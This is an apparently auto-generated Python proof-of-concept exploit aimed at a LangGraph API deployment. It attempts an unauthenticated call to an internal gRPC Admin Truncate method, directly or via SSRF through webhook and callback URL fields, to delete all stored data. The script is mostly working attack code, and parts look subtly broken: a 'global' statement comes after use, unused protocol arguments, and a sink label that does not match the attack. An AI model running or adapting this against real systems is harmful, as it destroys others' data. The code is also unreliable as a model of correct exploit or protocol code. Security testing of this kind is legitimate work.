#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: langgraph-000
# Sink: value_from_proto
# Auto-generated — run with: python3 langgraph_specific_vulnerabilities_value_from_proto_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit: LangGraph gRPC Unauthenticated Admin Truncate + SSRF

This PoC demonstrates two vulnerabilities:
1. SSRF from the HTTP API to the internal gRPC endpoint (localhost:50051)
2. Unauthenticated Admin Truncate service that deletes all data

The exploit sends a crafted HTTP request to the LangGraph API that triggers
an SSRF to the internal gRPC Admin service, calling the Truncate method
to delete all stored data.

WARNING: This will DELETE ALL DATA in the target LangGraph instance.
Use only on systems you own or have explicit permission to test.
"""

import json
import sys
import time
import urllib.request
import urllib.error
import urllib.parse
import base64
import struct
import socket
import ssl
from typing import Optional, Dict, Any

# Configuration - change these for your target
TARGET_HOST = "localhost"  # The LangGraph HTTP API host
TARGET_PORT = 8123         # Default LangGraph HTTP API port
GRPC_PORT = 50051          # Internal gRPC port (localhost only)
TIMEOUT = 10               # Request timeout in seconds

# gRPC message types we need to construct
# These are simplified protobuf wire format messages

def build_grpc_message(service: str, method: str, payload: bytes) -> bytes:
    """
    Build a minimal gRPC HTTP/2 frame.
    For simplicity, we use HTTP/1.1 with gRPC-Web protocol.
    """
    # gRPC-Web request format:
    # 1 byte compressed flag (0 = uncompressed)
    # 4 bytes message length (big-endian)
    # message payload
    
    compressed_flag = b'\x00'
    message_length = struct.pack('>I', len(payload))
    return compressed_flag + message_length + payload

def build_truncate_request() -> bytes:
    """
    Build a gRPC Admin Truncate request.
    The Truncate method takes an empty message (google.protobuf.Empty).
    """
    # google.protobuf.Empty is just an empty message
    # In protobuf wire format, an empty message is just zero bytes
    return b''

def build_http_grpc_request(service: str, method: str, payload: bytes) -> bytes:
    """
    Build an HTTP/1.1 POST request for gRPC-Web.
    """
    grpc_message = build_grpc_message(service, method, payload)
    
    # gRPC-Web content-type
    content_type = b'application/grpc-web+proto'
    
    # Build the HTTP request
    path = f"/{service}/{method}".encode()
    
    request = (
        f"POST {path.decode()} HTTP/1.1\r\n"
        f"Host: localhost:{GRPC_PORT}\r\n"
        f"Content-Type: {content_type.decode()}\r\n"
        f"Content-Length: {len(grpc_message)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode() + grpc_message
    
    return request

def send_grpc_via_ssrf(target_host: str, target_port: int, 
                        grpc_service: str, grpc_method: str, 
                        grpc_payload: bytes) -> Optional[bytes]:
    """
    Send a gRPC request via SSRF through the LangGraph HTTP API.
    
    The LangGraph API has endpoints that can make internal requests.
    We'll try to use the webhook or run creation endpoints to trigger
    an SSRF to the internal gRPC port.
    """
    
    # Try multiple SSRF vectors
    ssrf_vectors = [
        # Vector 1: Webhook URL in run creation
        {
            "url": f"http://{target_host}:{target_port}/runs",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "body": json.dumps({
                "assistant_id": "00000000-0000-0000-0000-000000000000",
                "input": {"input": "test"},
                "webhook": f"http://localhost:{GRPC_PORT}/{grpc_service}/{grpc_method}"
            })
        },
        # Vector 2: Metadata with internal URL
        {
            "url": f"http://{target_host}:{target_port}/runs",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "body": json.dumps({
                "assistant_id": "00000000-0000-0000-0000-000000000000",
                "input": {"input": "test"},
                "metadata": {
                    "callback_url": f"http://localhost:{GRPC_PORT}/{grpc_service}/{grpc_method}"
                }
            })
        }
    ]
    
    for vector in ssrf_vectors:
        try:
            req = urllib.request.Request(
                vector["url"],
                data=vector["body"].encode() if isinstance(vector["body"], str) else vector["body"],
                headers=vector["headers"],
                method=vector["method"]
            )
            
            # Disable SSL verification for testing
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            with urllib.request.urlopen(req, timeout=TIMEOUT, context=ctx) as response:
                print(f"[+] SSRF request sent via {vector['url']}")
                print(f"[+] Response status: {response.status}")
                return response.read()
                
        except urllib.error.HTTPError as e:
            print(f"[!] HTTP error for {vector['url']}: {e.code} {e.reason}")
            if e.code == 404:
                continue  # Try next vector
            elif e.code == 422:
                # Unprocessable entity - might mean we reached the server
                print(f"[*] Got 422 - server processed our request")
                continue
            else:
                print(f"[!] Unexpected HTTP error: {e.code}")
        except urllib.error.URLError as e:
            print(f"[!] URL error: {e.reason}")
        except Exception as e:
            print(f"[!] Unexpected error: {e}")
    
    return None

def direct_grpc_connection(grpc_service: str, grpc_method: str, 
                          grpc_payload: bytes) -> Optional[bytes]:
    """
    Try direct gRPC connection (if we're on the same host).
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect(('127.0.0.1', GRPC_PORT))
        
        # Build and send HTTP/1.1 gRPC-Web request
        http_request = build_http_grpc_request(grpc_service, grpc_method, grpc_payload)
        sock.sendall(http_request)
        
        # Read response
        response = b''
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        
        sock.close()
        
        if response:
            print(f"[+] Direct gRPC connection successful")
            print(f"[+] Response length: {len(response)} bytes")
            return response
        else:
            print(f"[!] Empty response from direct gRPC connection")
            
    except ConnectionRefusedError:
        print(f"[!] Direct gRPC connection refused (port {GRPC_PORT})")
    except socket.timeout:
        print(f"[!] Direct gRPC connection timed out")
    except Exception as e:
        print(f"[!] Direct gRPC connection error: {e}")
    
    return None

def exploit_truncate(target_host: str, target_port: int) -> bool:
    """
    Attempt to exploit the Admin Truncate vulnerability.
    Returns True if successful, False otherwise.
    """
    print(f"\n[*] Attempting to exploit Admin Truncate vulnerability")
    print(f"[*] Target: {target_host}:{target_port}")
    print(f"[*] Internal gRPC port: {GRPC_PORT}")
    print(f"[*] WARNING: This will DELETE ALL DATA in the LangGraph instance!")
    print(f"[*] Press Ctrl+C within 3 seconds to abort...")
    
    try:
        time.sleep(3)  # Give user chance to abort
    except KeyboardInterrupt:
        print("\n[!] Aborted by user")
        return False
    
    # Build the Truncate request (empty message)
    truncate_payload = build_truncate_request()
    
    # Try direct gRPC connection first (if running on same host)
    print("\n[*] Trying direct gRPC connection...")
    response = direct_grpc_connection("langgraph.api.v1.Admin", "Truncate", truncate_payload)
    
    if response:
        print("[+] Direct gRPC Truncate request sent successfully")
        return True
    
    # Try SSRF via HTTP API
    print("\n[*] Trying SSRF via HTTP API...")
    response = send_grpc_via_ssrf(
        target_host, target_port,
        "langgraph.api.v1.Admin", "Truncate",
        truncate_payload
    )
    
    if response:
        print("[+] SSRF Truncate request sent successfully")
        return True
    
    print("[!] Failed to send Truncate request via any vector")
    return False

def check_vulnerability(target_host: str, target_port: int) -> Dict[str, Any]:
    """
    Check if the target is vulnerable by probing various endpoints.
    """
    results = {
        "http_reachable": False,
        "grpc_reachable": False,
        "ssrf_possible": False,
        "truncate_executed": False
    }
    
    # Check HTTP API
    try:
        req = urllib.request.Request(f"http://{target_host}:{target_port}/health")
        with urllib.request.urlopen(req, timeout=TIMEOUT) as response:
            results["http_reachable"] = True
            print(f"[+] HTTP API reachable at {target_host}:{target_port}")
    except Exception as e:
        print(f"[!] HTTP API not reachable: {e}")
        return results
    
    # Check if gRPC port is directly accessible
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect(('127.0.0.1', GRPC_PORT))
        sock.close()
        results["grpc_reachable"] = True
        print(f"[+] gRPC port {GRPC_PORT} is directly accessible")
    except:
        print(f"[*] gRPC port {GRPC_PORT} not directly accessible (expected)")
    
    # Try to trigger SSRF
    print("\n[*] Testing SSRF capability...")
    test_payload = build_truncate_request()
    response = send_grpc_via_ssrf(
        target_host, target_port,
        "langgraph.api.v1.Admin", "Truncate",
        test_payload
    )
    
    if response:
        results["ssrf_possible"] = True
        print("[+] SSRF to gRPC is possible!")
    
    return results

def main():
    """Main exploit function."""
    print("=" * 60)
    print("LangGraph Unauthenticated Admin Truncate Exploit PoC")
    print("=" * 60)
    print(f"\nTarget: {TARGET_HOST}:{TARGET_PORT}")
    print(f"Internal gRPC: localhost:{GRPC_PORT}")
    
    # Parse command line arguments if provided
    if len(sys.argv) > 1:
        global TARGET_HOST, TARGET_PORT
        parts = sys.argv[1].split(':')
        TARGET_HOST = parts[0]
        if len(parts) > 1:
            TARGET_PORT = int(parts[1])
    
    # Check vulnerability
    print("\n[*] Checking target vulnerability...")
    vuln_status = check_vulnerability(TARGET_HOST, TARGET_PORT)
    
    if not vuln_status["http_reachable"]:
        print("\n[!] Target HTTP API is not reachable. Exiting.")
        sys.exit(1)
    
    # Ask for confirmation before exploiting
    print("\n" + "!" * 60)
    print("!!! DANGER: This will DELETE ALL DATA in the LangGraph instance !!!")
    print("!" * 60)
    
    try:
        confirm = input("\nType 'EXPLOIT' to proceed (or anything else to abort): ")
    except KeyboardInterrupt:
        print("\n[!] Aborted by user")
        sys.exit(0)
    
    if confirm != "EXPLOIT":
        print("[!] Aborted by user")
        sys.exit(0)
    
    # Execute the exploit
    success = exploit_truncate(TARGET_HOST, TARGET_PORT)
    
    if success:
        print("\n[+] Exploit completed successfully!")
        print("[+] The Admin Truncate service should have deleted all data.")
        print("[+] Verify by checking if the LangGraph instance is now empty.")
    else:
        print("\n[!] Exploit failed.")
        print("[!] The target may not be vulnerable or the SSRF vector may differ.")
        print("[!] Check the error messages above for details.")

if __name__ == "__main__":
    main()
